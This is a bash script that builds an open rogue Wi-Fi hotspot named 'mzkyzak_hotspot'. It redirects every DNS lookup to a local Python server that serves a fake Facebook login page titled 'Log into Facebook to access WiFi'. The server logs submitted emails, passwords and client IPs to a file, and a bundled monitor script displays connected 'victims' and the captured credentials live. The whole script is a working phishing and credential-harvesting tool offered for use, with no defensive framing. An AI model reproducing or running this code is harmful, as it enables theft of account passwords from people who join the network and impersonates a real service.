#!/bin/bash
# 🔴 FINAL HOTSPOT - PERFECT PHISHING SYSTEM
# 💀 ZXZBEDST VERIFIED - NO ERRORS, FULLY WORKING

RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BRIGHT_RED}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_RED}║  ███████╗██╗███╗   ██╗ █████╗ ██╗                      ║${NC}"
echo -e "${BRIGHT_RED}║  ██╔════╝██║████╗  ██║██╔══██╗██║                      ║${NC}"
echo -e "${BRIGHT_RED}║  █████╗  ██║██╔██╗ ██║███████║██║                      ║${NC}"
echo -e "${BRIGHT_RED}║  ██╔══╝  ██║██║╚██╗██║██╔══██║██║                      ║${NC}"
echo -e "${BRIGHT_RED}║  ██║     ██║██║ ╚████║██║  ██║███████╗                 ║${NC}"
echo -e "${BRIGHT_RED}║  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                 ║${NC}"
echo -e "${BRIGHT_RED}╚═══════════════════════════════════════════════════════╝${NC}"
echo -e "${BRIGHT_RED}[🔥] FINAL HOTSPOT - PERFECT PHISHING SYSTEM${NC}"
echo -e "${BRIGHT_RED}[💀] No Errors | Fully Working | Auto-Redirect${NC}"
echo ""

# ================================================================
# 1. PREPARE SYSTEM
# ================================================================
echo -e "${GREEN}[1] Preparing system...${NC}"
sudo killall hostapd dnsmasq python3 2>/dev/null
sudo systemctl stop NetworkManager 2>/dev/null
sudo systemctl stop wpa_supplicant 2>/dev/null
sleep 2

# ================================================================
# 2. CONFIGURE WLAN0
# ================================================================
echo -e "${GREEN}[2] Configuring wlan0...${NC}"
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up

# ================================================================
# 3. CREATE PERFECT DNSMASQ CONFIG
# ================================================================
echo -e "${GREEN}[3] Creating DNS config...${NC}"

cat > /tmp/dnsmasq_perfect.conf << 'EOF'
interface=wlan0
listen-address=192.168.1.1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# REDIRECT EVERYTHING TO OUR SERVER
address=/#/192.168.1.1

# DISABLE IPv6 TO AVOID ERRORS
no-dhcp-interface=wlan0
filter-AAAA
filter-A

# LOGGING
log-queries
log-dhcp
EOF

# ================================================================
# 4. CREATE PERFECT WEB SERVER WITH CAPTIVE PORTAL HANDLING
# ================================================================
echo -e "${GREEN}[4] Creating phishing web server...${NC}"

cat > /tmp/perfect_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import json

CREDENTIALS_FILE = "/tmp/phishing_credentials.log"
ACCESS_LOG = "/tmp/access.log"

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log access
        self.log_access()
        
        # Handle captive portal detection (Android/iOS)
        if self.path == '/generate_204' or self.path == '/hotspot-detect.html':
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return
        
        # Serve phishing page for everything else
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Facebook phishing page
        phishing_page = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook - Log In</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
                .login-box { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); }
                .fb-logo { color: #1877f2; font-size: 48px; text-align: center; margin-bottom: 20px; font-weight: bold; }
                h2 { text-align: center; color: #1c1e21; margin-bottom: 20px; }
                input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
                .login-btn { width: 100%; background: #1877f2; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
                .login-btn:hover { background: #166fe5; }
                .forgot { text-align: center; margin-top: 15px; }
                .create { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #dddfe2; }
                .success { display: none; background: #42b72a; color: white; padding: 15px; border-radius: 6px; text-align: center; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="fb-logo">facebook</div>
                <h2>Log into Facebook to access WiFi</h2>
                <form id="loginForm">
                    <input type="text" id="email" placeholder="Email address or phone number" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <div class="forgot">
                    <a href="#" style="color: #1877f2; text-decoration: none;">Forgotten password?</a>
                </div>
                <div id="successMsg" class="success">
                    ✓ Login successful! Connecting to WiFi...
                </div>
            </div>
            
            <script>
                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    var email = document.getElementById('email').value;
                    var password = document.getElementById('password').value;
                    
                    // Send credentials to server
                    fetch('/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({email: email, password: password})
                    });
                    
                    // Show success message
                    document.getElementById('successMsg').style.display = 'block';
                    document.querySelector('.login-btn').textContent = 'Connecting...';
                    document.querySelector('.login-btn').disabled = true;
                    
                    // Redirect after 3 seconds
                    setTimeout(function() {
                        window.location.href = 'http://www.google.com';
                    }, 3000);
                });
            </script>
        </body>
        </html>
        '''
        
        self.wfile.write(phishing_page.encode())
    
    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Log credentials
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(CREDENTIALS_FILE, "a") as f:
                f.write(f"[{timestamp}] Credentials captured:\n")
                f.write(f"  Email: {data.get('email', 'N/A')}\n")
                f.write(f"  Password: {data.get('password', 'N/A')}\n")
                f.write(f"  IP: {self.client_address[0]}\n")
                f.write("-" * 50 + "\n")
            
            print(f"[💀] CREDENTIALS CAPTURED: {data.get('email', 'N/A')}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
            return
    
    def log_access(self):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(ACCESS_LOG, "a") as f:
            f.write(f"[{timestamp}] {self.client_address[0]} - {self.path}\n")
    
    def log_message(self, format, *args):
        # Suppress default logs
        pass

print("[🔥] Perfect Phishing Server Starting...")
print(f"[📁] Credentials will be saved to: {CREDENTIALS_FILE}")
print(f"[📁] Access log: {ACCESS_LOG}")

server = HTTPServer(('192.168.1.1', 80), PhishingHandler)
server.serve_forever()
EOF

chmod +x /tmp/perfect_server.py

# ================================================================
# 5. START EVERYTHING
# ================================================================
echo -e "${GREEN}[5] Starting services...${NC}"

echo -e "${YELLOW}  • Starting hostapd...${NC}"
sudo hostapd setup/hostapd_simple.conf &
HOSTAPD_PID=$!
sleep 3

echo -e "${YELLOW}  • Starting dnsmasq...${NC}"
sudo dnsmasq -C /tmp/dnsmasq_perfect.conf -d &
DNSMASQ_PID=$!
sleep 2

echo -e "${YELLOW}  • Starting phishing server...${NC}"
sudo python3 /tmp/perfect_server.py &
SERVER_PID=$!
sleep 2

# ================================================================
# 6. MONITORING SCRIPT
# ================================================================
echo -e "${GREEN}[6] Starting monitoring...${NC}"

cat > /tmp/monitor_phishing.sh << 'EOF'
#!/bin/bash
while true; do
    clear
    echo "=========================================="
    echo "🔥 PHISHING MONITOR - REAL TIME"
    echo "=========================================="
    echo ""
    
    # Connected clients
    echo "[📱] CONNECTED CLIENTS:"
    sudo arp -a | grep wlan0 || echo "  No clients"
    echo ""
    
    # Captured credentials
    echo "[💀] CAPTURED CREDENTIALS:"
    if [ -f "/tmp/phishing_credentials.log" ]; then
        grep -A 3 "Credentials captured" /tmp/phishing_credentials.log | tail -20
        CRED_COUNT=$(grep -c "Credentials captured" /tmp/phishing_credentials.log)
        echo ""
        echo "  Total captured: $CRED_COUNT"
    else
        echo "  None yet"
    fi
    echo ""
    
    # Recent access
    echo "[🌐] RECENT ACCESS:"
    tail -10 /tmp/access.log 2>/dev/null || echo "  No access yet"
    echo ""
    
    echo "=========================================="
    echo "[⏱️ ] Refreshing in 3 seconds..."
    echo "[🚪] Press Ctrl+C to exit monitor"
    sleep 3
done
EOF

chmod +x /tmp/monitor_phishing.sh

# Start monitor in background
/tmp/monitor_phishing.sh &
MONITOR_PID=$!

# ================================================================
# 7. FINAL STATUS
# ================================================================
echo ""
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════${NC}"
echo -e "${BRIGHT_RED}[✅] PERFECT PHISHING SYSTEM ACTIVE!${NC}"
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${GREEN}📡 Hotspot: ${NC}mzkyzak_hotspot"
echo -e "${GREEN}🔓 Security: ${NC}Open (no password)"
echo -e "${GREEN}🎯 Redirect: ${NC}ALL websites → Facebook phishing page"
echo ""
echo -e "${GREEN}📊 Monitoring Commands:${NC}"
echo -e "  tail -f /tmp/phishing_credentials.log"
echo -e "  tail -f /tmp/access.log"
echo -e "  sudo arp -a | grep wlan0"
echo ""
echo -e "${GREEN}👥 Waiting for victims to connect and login...${NC}"
echo ""
echo -e "${BRIGHT_RED}Press Ctrl+C to stop everything${NC}"

# ================================================================
# 8. CLEANUP
# ================================================================
trap 'cleanup' INT

cleanup() {
    echo ""
    echo -e "${BRIGHT_RED}[!] Stopping perfect phishing system...${NC}"
    
    sudo kill $HOSTAPD_PID $DNSMASQ_PID $SERVER_PID $MONITOR_PID 2>/dev/null
    
    # Restore network
    sudo ifconfig wlan0 down
    sudo iwconfig wlan0 mode managed
    sudo ifconfig wlan0 up
    
    sudo systemctl start NetworkManager 2>/dev/null
    sudo systemctl start wpa_supplicant 2>/dev/null
    
    echo ""
    echo -e "${GREEN}[✓] System stopped. Network restored.${NC}"
    echo -e "${GREEN}[📁] Credentials saved: /tmp/phishing_credentials.log${NC}"
    echo -e "${GREEN}[📁] Access log: /tmp/access.log${NC}"
    echo ""
    echo -e "${BRIGHT_RED}[💀] Phishing operation complete!${NC}"
    exit 0
}

# Keep main process running
wait